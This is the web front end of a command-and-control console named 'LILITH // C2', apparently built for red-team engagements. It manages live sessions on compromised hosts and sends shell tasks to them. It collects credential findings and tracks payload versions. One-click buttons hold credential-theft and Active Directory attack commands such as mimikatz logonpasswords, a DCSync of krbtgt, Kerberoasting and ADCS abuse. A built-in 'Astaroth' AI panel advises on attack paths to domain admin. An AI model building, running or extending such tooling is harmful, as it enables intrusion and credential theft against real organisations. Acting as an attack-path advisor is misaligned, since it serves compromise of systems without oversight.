th { text-align:left; padding:5px 10px; font-size:9px; letter-spacing:.1em;
     color:var(--dim); border-bottom:1px solid var(--bord2); }
td { padding:7px 10px; border-bottom:1px solid var(--border); vertical-align:top; }
tr:hover td { background:var(--surf3); }
::-webkit-scrollbar { width:4px; height:4px; }
::-webkit-scrollbar-track { background:var(--bg); }
::-webkit-scrollbar-thumb { background:var(--bord2); border-radius:4px; }
input[type=text] {
  background:var(--surf3); border:1px solid var(--bord2); color:var(--text);
  font:11px var(--mono); padding:4px 8px; border-radius:2px;
}
input[type=text]:focus { outline:none; border-color:var(--red); }

/* ── Tool catalog ── */
.tool-row {
  display:flex; align-items:center; gap:10px;
  padding:8px 16px; border-bottom:1px solid var(--border);
  transition:background .1s;
}
.tool-row:hover { background:var(--surf3); }
.tool-status { width:14px; flex-shrink:0; text-align:center; font-size:12px; }
.tool-name  { font-size:12px; color:var(--text); flex-shrink:0; min-width:110px; }
.tool-desc  { font-size:10px; color:var(--dim); flex:1; }
.tool-params {
  background:var(--surf3); border:1px solid var(--bord2); color:var(--dim2);
  font:10px var(--mono); padding:3px 6px; border-radius:2px; width:220px; flex-shrink:0;
}
.tool-params:focus { outline:none; border-color:var(--red); color:var(--text); }
.tool-run {
  padding:3px 10px; font-size:10px; border:1px solid var(--red); border-radius:2px;
  background:transparent; color:var(--red2); font:10px var(--mono);
  cursor:pointer; flex-shrink:0; white-space:nowrap; transition:all .1s;
}
.tool-run:hover:not(:disabled) { background:var(--red3); }
.tool-run:disabled { opacity:.3; cursor:default; border-color:var(--bord2); color:var(--dim); }
.tool-run.ok { border-color:var(--green); color:var(--glow); }
.tool-cat-hdr {
  padding:6px 16px; font-size:9px; letter-spacing:.12em; color:var(--dim);
  background:var(--surf2); border-bottom:1px solid var(--border);
}

/* ── Astaroth chat panel ── */
#astaroth-panel {
  position:fixed; right:0; top:38px; bottom:0; width:380px;
  background:var(--surf); border-left:1px solid var(--border);
  display:none; flex-direction:column; z-index:50;
  transform:translateX(100%); transition:transform .2s ease;
}
#astaroth-panel.open { display:flex; transform:translateX(0); }
#ast-hdr {
  padding:10px 14px; border-bottom:1px solid var(--border);
  display:flex; align-items:center; gap:8px; flex-shrink:0;
}
#ast-hdr-title { font-size:11px; color:var(--red2); letter-spacing:.1em; flex:1; }
#ast-hdr-ctx { font-size:9px; color:var(--dim); }
#ast-close { cursor:pointer; color:var(--dim); font-size:14px; padding:2px 4px; }
#ast-close:hover { color:var(--text); }
#ast-msgs { flex:1; overflow-y:auto; padding:12px 14px; display:flex; flex-direction:column; gap:10px; }
.ast-msg { border-radius:3px; padding:8px 10px; font-size:11px; line-height:1.6; }
.ast-msg-user { background:var(--red4); border:1px solid var(--red3); color:var(--text);
                align-self:flex-end; max-width:90%; }
.ast-msg-ai   { background:var(--surf2); border:1px solid var(--border); color:var(--text);
                align-self:flex-start; white-space:pre-wrap; word-break:break-word; }
.ast-msg-sys  { color:var(--dim); font-size:10px; font-style:italic; text-align:center; }
.ast-streaming::after { content:'▋'; color:var(--red2); animation:blink .8s step-start infinite; }
@keyframes blink { 50% { opacity:0; } }
#ast-input-bar {
  display:flex; gap:6px; align-items:flex-end;
  padding:8px 12px; border-top:1px solid var(--border); flex-shrink:0;
}
#ast-input {
  flex:1; background:var(--surf3); border:1px solid var(--bord2); color:var(--text);
  font:11px var(--mono); padding:6px 8px; border-radius:2px; resize:none;
  min-height:36px; max-height:120px; outline:none;
}
#ast-input:focus { border-color:var(--red); }
#ast-toggle {
  display:flex; align-items:center; gap:4px;
  padding:3px 8px; border:1px solid var(--red); border-radius:2px;
  background:transparent; color:var(--red2); font:10px var(--mono);
  cursor:pointer; letter-spacing:.08em; transition:all .1s;
}
#ast-toggle:hover { background:var(--red3); }
#ast-toggle.active { background:var(--red3); }
</style>
</head>
<body>
<div id="app">

<!-- ── Top bar ── -->
<div id="topbar">
  <div class="logo">LILITH <span>// C2</span></div>
  <div id="topnav">
    <div class="tnav active" data-gv="ops"      onclick="setGV('ops')">OPERATIONS</div>
    <div class="tnav"        data-gv="arsenal"  onclick="setGV('arsenal')">ARSENAL</div>
    <div class="tnav"        data-gv="attack"   onclick="setGV('attack')">ATT&amp;CK</div>
    <div class="tnav"        data-gv="report"   onclick="setGV('report')">REPORT</div>
    <div class="tnav"        data-gv="admin"    onclick="setGV('admin')">ADMIN</div>
  </div>
  <div id="topbar-right">
    <div id="live-pill">
      <span class="dot dot-d" id="sse-dot"></span>
      <span id="live-count">0 live</span>
    </div>
    <span id="ticker">—</span>
    <span id="ts"></span>
  </div>
</div>

<!-- ── Body ── -->
<div id="body">

  <!-- Session sidebar (always visible) -->
  <div id="sess-sidebar">
    <div id="sess-sidebar-hdr">
      <span>SESSIONS</span>
      <span id="sess-count" style="color:var(--dim2)">0</span>
    </div>
    <div id="sess-list">
      <div class="sess-empty">No active sessions</div>
    </div>
  </div>

  <!-- Main panel -->
  <div id="main">

    <!-- Operations view -->
    <div id="ops-view">
      <div id="sess-detail">
        <!-- Nothing selected -->
        <div id="no-session">
          <div class="big">◈</div>
          <div>select a session</div>
        </div>

        <!-- Session panel -->
        <div id="session-panel">
          <!-- Session header -->
          <div id="sess-hdr">
            <div>
              <div id="sess-hdr-host">—</div>
              <div id="sess-hdr-ip" style="margin-top:1px"></div>
            </div>
            <div id="sess-hdr-badges"></div>
            <div id="sess-hdr-stats">
              <div class="hdr-stat">Tasks <strong id="hdr-tasks">0</strong></div>
              <div class="hdr-stat">Creds <strong id="hdr-creds">0</strong></div>
              <div class="hdr-stat">Techs <strong id="hdr-techs">0</strong></div>
            </div>
            <div id="sess-hdr-actions">
              <button class="btn btn-sm" onclick="refreshSession()">↺</button>
              <button id="ast-toggle" onclick="toggleAstaroth()">⟁ ASTAROTH</button>
              <button class="btn btn-sm btn-red" onclick="killSession()">KILL</button>
            </div>
          </div>

          <!-- Tabs -->
          <div id="sess-tabs">
            <div class="stab active" data-tab="shell"   onclick="setTab('shell')">SHELL</div>
            <div class="stab"        data-tab="history" onclick="setTab('history')">
              HISTORY <span class="tab-badge" id="badge-history" style="display:none"></span>
            </div>
            <div class="stab"        data-tab="creds"   onclick="setTab('creds')">
              CREDS <span class="tab-badge" id="badge-creds" style="display:none"></span>
            </div>
            <div class="stab"        data-tab="info"    onclick="setTab('info')">INFO</div>
          </div>

          <!-- Shell tab -->
          <div id="tab-shell">
            <div class="quick-bar">
              <span class="qlabel">HOST▸</span>
              <button class="qbtn" onclick="qi('whoami /all')">whoami /all</button>
              <button class="qbtn" onclick="qi('hostname')">hostname</button>
              <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig</button>
              <button class="qbtn" onclick="qi('systeminfo')">sysinfo</button>
              <button class="qbtn" onclick="qi('tasklist /v')">tasklist</button>
              <button class="qbtn" onclick="qi('netstat -ano')">netstat</button>
              <button class="qbtn" onclick="qi('net share')">shares</button>
              <button class="qbtn" onclick="qi('arp -a')">arp</button>
              <button class="qbtn" onclick="qi('migrate')">migrate</button>
              <button class="qbtn" onclick="qi('screenshot')">screenshot</button>
              <span class="qlabel" style="margin-left:8px">AD▸</span>
              <button class="qbtn" onclick="qi('net user /domain')">users</button>
              <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">DA</button>
              <button class="qbtn" onclick="qi('net group \"Enterprise Admins\" /domain')">EA</button>
              <button class="qbtn" onclick="qi('nltest /domain_trusts /all_trusts')">trusts</button>
              <button class="qbtn" onclick="qi('nltest /dclist:')">DCs</button>
              <button class="qbtn" onclick="qi('wmic os get Caption,Version,BuildNumber /format:list')">os</button>
              <span class="qlabel" style="margin-left:8px">KERBEROS▸</span>
              <button class="qbtn" onclick="qi('Rubeus triage')">triage</button>
              <button class="qbtn" onclick="qi('Rubeus kerberoast /outfile:hashes.txt /nowrap')">kerberoast</button>
              <button class="qbtn" onclick="qi('Rubeus asreproast /format:hashcat /nowrap')">asreproast</button>
              <button class="qbtn" onclick="qi('Certify find /vulnerable')">ADCS</button>
              <button class="qbtn" onclick="qi('Whisker list')">shadow creds</button>
              <button class="qbtn" onclick="qi('SharpView Get-DomainUser -SPN')">SPNs</button>
              <button class="qbtn" onclick="qi('SharpView Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\"}')">ACLs</button>
              <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
              <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
              <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
            </div>
            <div id="shell-out"></div>
            <div id="shell-input-bar">
              <span id="shell-prompt-lbl">C2&gt;</span>
              <input id="shell-input" type="text" placeholder="command..."
                     onkeydown="shellKey(event)" autocomplete="off" spellcheck="false">
              <button class="btn btn-red btn-sm" onclick="shellSend()">EXEC</button>
              <button class="btn btn-sm" onclick="shellClear()">CLR</button>
            </div>
          </div>

          <!-- History tab -->
          <div id="tab-history"></div>

          <!-- Creds tab -->
          <div id="tab-creds"></div>

          <!-- Info tab -->
          <div id="tab-info"></div>
        </div>
      </div>
    </div>

    <!-- Arsenal view -->
    <div class="gview" id="gv-arsenal">
      <div class="gview-hdr">
        <div class="gview-title"><span>WORKSPACE</span><strong>Arsenal</strong></div>
        <div style="display:flex;gap:0;margin-left:12px">
          <div class="tnav active" id="ars-tab-files" style="font-size:10px;height:38px"
               onclick="setArsTab('files')">FILES</div>
          <div class="tnav" id="ars-tab-tools" style="font-size:10px;height:38px"
               onclick="setArsTab('tools')">TOOLS</div>
        </div>
        <button class="btn btn-sm" style="margin-left:auto" onclick="reloadArsenal()">↺</button>
      </div>
      <div class="gview-body" style="padding:0">

        <!-- Files pane -->
        <div id="ars-files" style="padding:18px 20px">
          <div id="arsenal-ws" style="font-size:10px;color:var(--dim);margin-bottom:12px"></div>
          <div id="arsenal-body"></div>
        </div>

        <!-- Tools pane -->
        <div id="ars-tools" style="display:none;padding:0">
          <div style="padding:8px 16px;font-size:10px;color:var(--dim);border-bottom:1px solid var(--border);
                      display:flex;align-items:center;gap:8px;flex-wrap:wrap">
            <span style="color:var(--dim2)">TARGET SESSION:</span>
            <select id="ars-sess-sel" onchange="onArsSessChange()" style="
                background:var(--surf2);color:var(--fg);border:1px solid var(--border);
                padding:2px 6px;font-size:10px;font-family:inherit;cursor:pointer;flex:1;min-width:160px">
              <option value="">— select session —</option>
            </select>
          </div>
          <div id="arsenal-tools-body" style="overflow-y:auto"></div>
        </div>

      </div>
    </div>

    <!-- ATT&CK view -->
    <div class="gview" id="gv-attack">
      <div class="gview-hdr">
        <div class="gview-title"><span>MITRE</span><strong>ATT&amp;CK Coverage</strong></div>
      </div>
      <div class="gview-body">
        <div style="display:flex;gap:20px;margin-bottom:16px;flex-wrap:wrap">
          <div>
            <div style="font-size:9px;letter-spacing:.1em;color:var(--dim);margin-bottom:4px">COVERED</div>
            <div style="font-size:28px;font-weight:700;color:var(--red2)" id="atk-cov">—</div>
          </div>
          <div>
            <div style="font-size:9px;letter-spacing:.1em;color:var(--dim);margin-bottom:4px">TRACKED</div>
            <div style="font-size:28px;font-weight:700;color:var(--dim2)" id="atk-tot">—</div>
          </div>
        </div>
        <div class="atk-grid" id="atk-grid"></div>
      </div>
    </div>

    <!-- Report view -->
    <div class="gview" id="gv-report">
      <div class="gview-hdr">
        <div class="gview-title"><span>EXPORT</span><strong>Report</strong></div>
      </div>
      <div class="gview-body">
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:24px">
          <a class="btn" href="/ui/api/export/json" download="lilith.json">↓ JSON</a>
          <a class="btn" href="/ui/api/export/markdown" download="lilith.md">↓ Markdown</a>
        </div>
        <div style="font-size:9px;letter-spacing:.1em;color:var(--dim);margin-bottom:10px">SESSION LABELS</div>
        <div id="label-editor"></div>
      </div>
    </div>

    <!-- Admin view -->
    <div class="gview" id="gv-admin">
      <div class="gview-hdr">
        <div class="gview-title"><span>SERVER</span><strong>Administration</strong></div>
        <button class="btn btn-sm" onclick="loadAdmin()">↺</button>
      </div>
      <div class="gview-body" style="display:flex;gap:20px;flex-wrap:wrap;align-items:flex-start">

        <!-- Server status + operator -->
        <div style="flex:1;min-width:220px;max-width:260px">
          <div style="font-size:9px;letter-spacing:.12em;color:var(--dim);margin-bottom:10px">SERVER STATUS</div>
          <div style="background:var(--surf2);border:1px solid var(--border);border-radius:3px;padding:14px">
            <div class="info-grid" id="admin-status-grid" style="row-gap:8px"></div>
          </div>
          <div style="margin-top:14px">
            <button class="btn btn-sm btn-red" onclick="adminLogout()" style="width:100%">LOGOUT OPERATOR</button>
          </div>
        </div>

        <!-- Engagement config -->
        <div style="flex:2;min-width:300px">
          <div style="font-size:9px;letter-spacing:.12em;color:var(--dim);margin-bottom:10px">ENGAGEMENT CONFIG</div>
          <div style="background:var(--surf2);border:1px solid var(--border);border-radius:3px;padding:14px;display:flex;flex-direction:column;gap:10px">
            <div style="display:grid;grid-template-columns:90px 1fr;gap:8px 12px;align-items:center;font-size:11px">
              <span style="color:var(--dim)">Name</span>
              <input type="text" id="eng-name" placeholder="Corp — External PT">
              <span style="color:var(--dim)">Client</span>
              <input type="text" id="eng-client" placeholder="ACME Corp">
              <span style="color:var(--dim)">Scope</span>
              <input type="text" id="eng-scope" placeholder="10.0.0.0/8, *.acme.com">
              <span style="color:var(--dim)">Assessor</span>
              <input type="text" id="eng-assessor" placeholder="Operator handle">
              <span style="color:var(--dim)">Start</span>
              <input type="text" id="eng-start" placeholder="2026-01-01">
              <span style="color:var(--dim)">End</span>
              <input type="text" id="eng-end" placeholder="2026-01-31">
            </div>
            <textarea id="eng-notes" placeholder="Notes / scope exclusions…"
              style="background:var(--surf3);border:1px solid var(--bord2);color:var(--text);
                     font:11px var(--mono);padding:6px 8px;resize:vertical;min-height:60px;
                     border-radius:2px;outline:none"></textarea>
            <button class="btn btn-sm" id="eng-save-btn" onclick="saveEngagement()" style="align-self:flex-start">Save Config</button>
          </div>
        </div>

        <!-- Payload versions -->
        <div style="flex:2;min-width:280px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <span style="font-size:9px;letter-spacing:.12em;color:var(--dim)">PAYLOAD VERSIONS</span>
            <button class="btn btn-sm" onclick="snapshotPayloads()">Snapshot</button>
          </div>
          <div id="admin-versions"
            style="background:var(--surf2);border:1px solid var(--border);border-radius:3px;
                   padding:14px;max-height:400px;overflow-y:auto;font-size:11px">
            <div style="color:var(--dim)">Loading…</div>
          </div>
        </div>

      </div>
    </div>

  </div><!-- #main -->
</div><!-- #body -->
<!-- Astaroth chat panel (slide-in from right) -->
<div id="astaroth-panel">
  <div id="ast-hdr">
    <span style="font-size:13px">⟁</span>
    <span id="ast-hdr-title">ASTAROTH</span>
    <span id="ast-hdr-ctx">no session</span>
    <span id="ast-close" onclick="toggleAstaroth()">✕</span>
  </div>
  <div id="ast-msgs">
    <div class="ast-msg ast-msg-sys">
      Astaroth — red team AI consultant.<br>
      I have full context of the selected session.<br>
      Ask me about attack paths, credential abuse, lateral movement.
    </div>
  </div>
  <div id="ast-input-bar">
    <textarea id="ast-input" placeholder="what's the shortest path to DA?" rows="2"
      onkeydown="astKey(event)"></textarea>
    <button class="btn btn-red btn-sm" onclick="astSend()" style="flex-shrink:0;align-self:flex-end">ASK</button>
  </div>
</div>

</div><!-- #app -->

<script>
// ── state ──────────────────────────────────────────────────────────────────
let liveSessions = {};   // {sid: {host, stale, last_seen, pending}}
let dbSessions   = [];
let selectedSid  = null;
let sessDetail   = {};   // {session, tasks, events} for selectedSid
let shellHist    = [];
let histIdx      = -1;
let pendingPolls = {};   // task_id → intervalId
let pendingEls   = {};   // task_id → pending DOM element
let curTab       = 'shell';
let curGV        = 'ops';

// ── utils ──────────────────────────────────────────────────────────────────
const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const fmtSize = b => b < 1024 ? b+'B' : b < 1048576 ? (b/1024).toFixed(1)+'KB' : (b/1048576).toFixed(2)+'MB';
const fmtTs   = s => s ? s.slice(11,19) : '';

// ── clock ──────────────────────────────────────────────────────────────────
setInterval(() => {
  document.getElementById('ts').textContent =
    new Date().toISOString().replace('T',' ').slice(0,19)+' UTC';
}, 1000);

// ── SSE ────────────────────────────────────────────────────────────────────
function connectSSE() {
  const es = new EventSource('/ui/api/stream');
  es.onopen = () => {
    document.getElementById('sse-dot').className = 'dot dot-g';
  };
  es.onmessage = e => {
    try { handleSSE(JSON.parse(e.data)); } catch(_) {}
  };
  es.onerror = () => {
    document.getElementById('sse-dot').className = 'dot dot-y';
    es.close();
    setTimeout(connectSSE, 4000);
  };
}

function handleSSE(ev) {
  tick(ev);
  switch(ev.type) {
    case 'session_new':
      liveSessions[ev.id] = {host: ev.host, stale: false, last_seen: ev.ts, pending: 0};
      renderSessList();
      updateArsSessSelect();
      break;
    case 'session_killed':
      delete liveSessions[ev.id];
      if (selectedSid === ev.id) deselectSession();
      renderSessList();
      updateArsSessSelect();
      break;
    case 'task_result':
      if (pendingPolls[ev.task_id]) {
        clearInterval(pendingPolls[ev.task_id]);
        delete pendingPolls[ev.task_id];
      }
      fetchResult(ev.session_id, ev.task_id, ev.has_creds);
      if (ev.has_creds && ev.session_id === selectedSid) {
        updateCredsBadge();
      }
      break;
    case 'file_served':
      break;
    case 'ast_auto_start': {
      const panel = document.getElementById('astaroth-panel');
      if (!astOpen) {
        astOpen = true;
        panel.classList.add('open');
        document.getElementById('ast-toggle')?.classList.add('active');
        updateAstCtx();
      }
      astAppend('sys', `⚡ auto [${(ev.task_id||'').slice(0,8)}]`);
      const autoBubble = astAppend('ai', '');
      autoBubble.classList.add('ast-streaming');
      astPending[ev.stream_id] = autoBubble;
      break;
    }
    case 'ast_token': {
      const b = astPending[ev.id];
      if (b) {
        b.classList.remove('ast-streaming');
        b.textContent += ev.token;
        const msgs = document.getElementById('ast-msgs');
        if (msgs) msgs.scrollTop = msgs.scrollHeight;
      }
      break;
    }
    case 'ast_done': {
      const b = astPending[ev.id];
      if (b) {
        b.classList.remove('ast-streaming');
        if (ev.error) b.textContent = (b.textContent || '') + '\n\n[' + ev.error + ']';
        if (!b.textContent.trim()) b.textContent = '[no response]';
        delete astPending[ev.id];
      }
      break;
    }
  }
}

async function fetchResult(sid, tid, hasCreds) {
  try {
    const r = await fetch(`/ui/api/c2/${sid}/result/${tid}`);
    if (r.status === 200) {
      const txt = await r.text();
      if (pendingEls[tid]) { pendingEls[tid].remove(); delete pendingEls[tid]; }
      if (sid === selectedSid) appendShellResult(tid, txt, hasCreds);
    }
  } catch(_) {}
}

function tick(ev) {
  const el = document.getElementById('ticker');
  const ts = ev.ts || '';
  const msgs = {
    session_new:  `[${ts}] NEW SESSION  ${ev.id?.slice(0,12)} ← ${ev.host}`,
    task_result:  `[${ts}] RESULT  ${ev.task_id?.slice(0,8)}  sid=${ev.session_id?.slice(0,10)}${ev.has_creds?' ⚷ CREDS':''}`,
    file_served:  `[${ts}] SERVED  ${ev.name}  → ${ev.client}  (${fmtSize(ev.size||0)})`,
    task_queued:  `[${ts}] QUEUED  ${ev.cmd?.slice(0,40)}`,
    session_killed: `[${ts}] KILLED  ${ev.id?.slice(0,12)}`,
    snapshot:       `[${ts}] SNAPSHOT  ${ev.snapped} payload(s) versioned`,
  };
  if (msgs[ev.type]) {
    el.textContent = msgs[ev.type];
    el.className = 'flash';
    setTimeout(() => el.className = '', 2000);
  }
}

// ── nav ────────────────────────────────────────────────────────────────────
function setGV(gv) {
  curGV = gv;
  document.querySelectorAll('.tnav').forEach(el =>
    el.classList.toggle('active', el.dataset.gv === gv));
  document.getElementById('ops-view').classList.toggle('hidden', gv !== 'ops');
  document.querySelectorAll('.gview').forEach(el =>
    el.classList.toggle('active', el.id === 'gv-'+gv));
  if (gv === 'arsenal') reloadArsenal();
  if (gv === 'attack')  loadAttack();
  if (gv === 'report')  loadReport();
  if (gv === 'admin')   loadAdmin();
}

function setTab(tab) {
  curTab = tab;
  document.querySelectorAll('.stab').forEach(el =>
    el.classList.toggle('active', el.dataset.tab === tab));
  document.getElementById('tab-shell').style.display   = tab === 'shell'   ? 'flex' : 'none';
  document.getElementById('tab-history').style.display = tab === 'history' ? 'block' : 'none';
  document.getElementById('tab-creds').style.display   = tab === 'creds'   ? 'block' : 'none';
  document.getElementById('tab-info').style.display    = tab === 'info'    ? 'block' : 'none';
  if (tab === 'history') renderHistory();
  if (tab === 'creds')   renderSessionCreds();
  if (tab === 'info')    renderInfo();
  if (tab === 'shell')   document.getElementById('shell-input').focus();
}

// ── session list ───────────────────────────────────────────────────────────
function renderSessList() {
  const el = document.getElementById('sess-list');
  const allSids = new Set([...dbSessions.map(s=>s.id), ...Object.keys(liveSessions)]);
  document.getElementById('sess-count').textContent = allSids.size;
  const alive = Object.values(liveSessions).filter(s=>!s.stale).length;
  document.getElementById('live-count').textContent = alive + ' live';

  if (!allSids.size) {
    el.innerHTML = '<div class="sess-empty">No sessions yet</div>';
    return;
  }

  const rows = [...allSids].map(sid => {
    const db   = dbSessions.find(s=>s.id===sid) || {};
    const live = liveSessions[sid] || null;
    const host = live ? live.host : (db.host||'?');
    const dot  = live ? (live.stale ? 'dot-y':'dot-g') : 'dot-d';
    const label = db.label ? `<div style="font-size:9px;color:var(--dim);margin-top:1px">${esc(db.label)}</div>` : '';
    return `<div class="sess-item ${sid===selectedSid?'active':''}" onclick="selectSession('${esc(sid)}')">
      <div class="sess-item-meta">
        <span class="dot ${dot}"></span>
        <span class="sess-item-id">${esc(sid.slice(0,14))}</span>
        <button class="sess-del" title="Remove from history" onclick="event.stopPropagation();dismissSession('${esc(sid)}')">×</button>
      </div>
      <div class="sess-item-host">${esc(host)}</div>
      ${label}
      ${live ? `<div style="font-size:9px;color:var(--dim);margin-top:1px">${esc(live.last_seen)}</div>` : ''}
    </div>`;
  });
  el.innerHTML = rows.join('');
}

async function selectSession(sid) {
  selectedSid = sid;
  renderSessList();
  document.getElementById('no-session').style.display   = 'none';
  document.getElementById('session-panel').style.display = 'flex';
  await refreshSession();
  shellClear();
  setTab('shell');
  document.getElementById('shell-input').focus();
  updateAstCtx();
}

function deselectSession() {
  selectedSid = null;
  sessDetail  = {};
  document.getElementById('no-session').style.display    = 'flex';
  document.getElementById('session-panel').style.display = 'none';
  renderSessList();
}

async function refreshSession() {
  if (!selectedSid) return;
  try {
    const r = await fetch('/ui/api/session/' + selectedSid);
    if (r.ok) {
      sessDetail = await r.json();
      renderSessionHeader();
      updateCredsBadge();
      updateHistBadge();
      if (curTab === 'history') renderHistory();
      if (curTab === 'creds')   renderSessionCreds();
      if (curTab === 'info')    renderInfo();
    }
  } catch(_) {}
}

function renderSessionHeader() {
  const s    = sessDetail.session || {};
  const live = liveSessions[selectedSid] || null;
  document.getElementById('sess-hdr-host').textContent = live ? live.host : (s.host||'—');
  document.getElementById('sess-hdr-ip').textContent   = selectedSid.slice(0,20);

  const tasks  = sessDetail.tasks || [];
  const creds  = tasks.filter(t => t.has_creds).length;
  const techs  = new Set(tasks.map(t=>t.technique_id).filter(Boolean)).size;
  document.getElementById('hdr-tasks').textContent = tasks.length;
  document.getElementById('hdr-creds').textContent = creds;
  document.getElementById('hdr-techs').textContent = techs;

  let badge = '';
  if (live) {
    badge = live.stale
      ? '<span class="badge badge-stale"><span class="dot dot-y"></span> STALE</span>'
      : '<span class="badge badge-alive"><span class="dot dot-g"></span> ALIVE</span>';
    if (live.pending > 0)
      badge += `<span style="font-size:10px;color:var(--amber);margin-left:6px">${live.pending} queued</span>`;
  } else {
    badge = '<span class="badge badge-dead">OFFLINE</span>';
  }
  document.getElementById('sess-hdr-badges').innerHTML = badge;
}

function updateCredsBadge() {
  const tasks = sessDetail.tasks || [];
  const n = tasks.filter(t => t.has_creds).length;
  const el = document.getElementById('badge-creds');
  if (n > 0) { el.textContent = n; el.style.display = 'inline'; }
  else        { el.style.display = 'none'; }
}

function updateHistBadge() {
  const n = (sessDetail.tasks||[]).length;
  const el = document.getElementById('badge-history');
  if (n > 0) { el.textContent = n; el.style.display = 'inline'; }
  else        { el.style.display = 'none'; }
}

// ── history tab ────────────────────────────────────────────────────────────
function renderHistory() {
  const el = document.getElementById('tab-history');
  const tasks = sessDetail.tasks || [];
  if (!tasks.length) {
    el.innerHTML = '<div style="color:var(--dim);padding:16px;font-size:11px">No tasks yet</div>';
    return;
  }
  el.innerHTML = tasks.map((t,i) => {
    const hasOut = t.output && t.output.trim();
    const credBadge = t.has_creds ? '<span style="color:var(--glow);font-size:9px">⚷ CREDS</span>' : '';
    const out = hasOut ? `<div class="hist-out">${esc(t.output.slice(0,4000))}${t.output.length>4000?'\n…truncated':''}
      <button class="cbtn" onclick="copyText(this,'${i}')" style="margin-top:6px">copy output</button></div>` : '';
    return `<div class="hist-row" onclick="this.classList.toggle('expanded')">
      <span class="hist-ts">${fmtTs(t.created_at||'')}</span>
      <span class="hist-cmd">${esc(t.command||'')}</span>
      <span class="hist-status">${credBadge}${hasOut?'<span style="color:var(--dim);font-size:10px">▼</span>':''}</span>
      ${out}
    </div>`;
  }).join('');
  // store outputs for copy
  window._histOutputs = tasks.map(t => t.output||'');
}

function copyText(btn, idx) {
  const txt = window._histOutputs[parseInt(idx)] || '';
  navigator.clipboard.writeText(txt).then(() => {
    btn.textContent = 'copied!'; btn.classList.add('ok');
    setTimeout(() => { btn.textContent='copy output'; btn.classList.remove('ok'); }, 1500);
  });
}

// ── creds tab ──────────────────────────────────────────────────────────────
function renderSessionCreds() {
  const el    = document.getElementById('tab-creds');
  const tasks = sessDetail.tasks || [];
  const credTasks = tasks.filter(t => t.has_creds && t.cred_hints?.length);
  if (!credTasks.length) {
    el.innerHTML = '<div style="color:var(--dim);padding:16px;font-size:11px">No credential findings</div>';
    return;
  }
  el.innerHTML = credTasks.map(t => {
    const hints = t.cred_hints.map(h =>
      `<div class="cred-value">${esc(h.value||h)}</div>
       <div class="cred-meta">${esc(h.type||'')}</div>`
    ).join('<hr style="border:none;border-top:1px solid var(--border);margin:6px 0">');
    return `<div class="cred-card">
      <div class="cred-type">FROM: ${esc((t.command||'').slice(0,60))}</div>
      ${hints}
    </div>`;
  }).join('');
}

// ── info tab ───────────────────────────────────────────────────────────────
function renderInfo() {
  const el   = document.getElementById('tab-info');
  const s    = sessDetail.session || {};
  const live = liveSessions[selectedSid] || null;
  const tasks = sessDetail.tasks || [];
  const techs = [...new Set(tasks.map(t=>t.technique_id).filter(Boolean))];
  const rows = [
    ['Session ID',   selectedSid],
    ['Host / IP',    live ? live.host : (s.host||'—')],
    ['First seen',   fmtTs(s.created_at||'')],
    ['Last seen',    live ? live.last_seen : '—'],
    ['Tasks',        tasks.length],
    ['Label',        s.label||'—'],
    ['Note',         s.note||'—'],
  ];
  const techHtml = techs.length
    ? techs.map(t => `<span style="display:inline-block;padding:1px 6px;border:1px solid var(--border);border-radius:2px;font-size:10px;margin:2px">${esc(t)}</span>`).join(' ')
    : '<span style="color:var(--dim)">none</span>';

  el.innerHTML = `
    <div class="info-grid">${rows.map(([k,v]) =>
      `<div class="info-key">${k}</div><div class="info-val">${esc(String(v))}</div>`
    ).join('')}</div>
    <div style="font-size:9px;letter-spacing:.1em;color:var(--dim);margin-bottom:8px">ATT&CK TECHNIQUES</div>
    <div>${techHtml}</div>
    <div style="margin-top:16px;font-size:9px;letter-spacing:.1em;color:var(--dim);margin-bottom:6px">LABEL EDITOR</div>
    <div style="display:flex;gap:6px;flex-wrap:wrap">
      <input type="text" id="edit-label" placeholder="label" value="${esc(s.label||'')}" style="flex:1;min-width:120px">
      <input type="text" id="edit-note"  placeholder="note"  value="${esc(s.note||'')}"  style="flex:2;min-width:200px">
      <button class="btn btn-sm" onclick="saveLabel()">Save</button>
    </div>`;
}

async function saveLabel() {
  if (!selectedSid) return;
  const label = document.getElementById('edit-label').value;
  const note  = document.getElementById('edit-note').value;
  await fetch('/ui/api/sessions/'+selectedSid+'/label', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({label, note}),
  });
  await refreshSession();
}

// ── shell ──────────────────────────────────────────────────────────────────
function qi(cmd) {
  document.getElementById('shell-input').value = cmd;
  document.getElementById('shell-input').focus();
}

function shellKey(e) {
  if (e.key === 'Enter') { shellSend(); return; }
  if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); shellClear(); return; }
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx < shellHist.length-1) histIdx++;
    document.getElementById('shell-input').value = shellHist[shellHist.length-1-histIdx]||'';
    return;
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx > 0) { histIdx--; }
    else { histIdx = -1; document.getElementById('shell-input').value = ''; return; }
    document.getElementById('shell-input').value = shellHist[shellHist.length-1-histIdx]||'';
  }
}

async function shellSend() {
  const inp = document.getElementById('shell-input');
  const cmd = inp.value.trim();
  if (!cmd) return;
  if (!selectedSid) { shellAppend('info', '— no session selected'); return; }
  inp.value = '';
  histIdx   = -1;
  shellHist.push(cmd);
  if (shellHist.length > 300) shellHist.shift();

  const cmdEl = shellAppendCmd(cmd);
  const pendEl = shellAppend('pending', '  ▸ dispatching…');

  try {
    const r = await fetch(`/ui/api/c2/${selectedSid}/task`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({cmd}),
    });
    if (!r.ok) {
      pendEl.textContent = '  [!] dispatch failed';
      pendEl.className = 'sl sl-err';
      return;
    }
    const {task_id} = await r.json();
    pendEl.textContent = '  ▸ waiting…';

    // SSE will resolve this fast; 2s poll is the fallback
    let n = 0;
    const iv = setInterval(async () => {
      n++;
      try {
